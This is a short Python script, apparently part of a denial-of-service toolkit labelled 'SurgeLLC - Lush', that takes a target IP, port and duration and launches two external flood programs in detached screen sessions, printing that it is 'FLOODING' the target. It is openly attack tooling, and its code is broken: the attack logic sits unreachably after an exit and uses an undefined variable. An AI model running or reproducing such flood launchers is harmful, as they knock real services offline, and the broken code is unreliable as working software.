#!/usr/bin/python



import socket,random,sys,time,os



if len(sys.argv)==1:

    sys.exit('[ SurgeLLC - Lush ]: ./ovh-atom [IP] [PORT] [TIME]')

    ip = sys.argv[1]
    port = sys.argv[2]
    time = sys.argv[3]

    os.system("screen -dmS OVH ./vsev2 " + host + " " + port + " 6 -1 " + time + "; screen -dmS ATOM ./ard " + host + " " + port + " ard.txt 7 -1 " + time + "")

    print('[OVH-ATOM] FLOODING %s ON PORT %s !' % (ip, port))
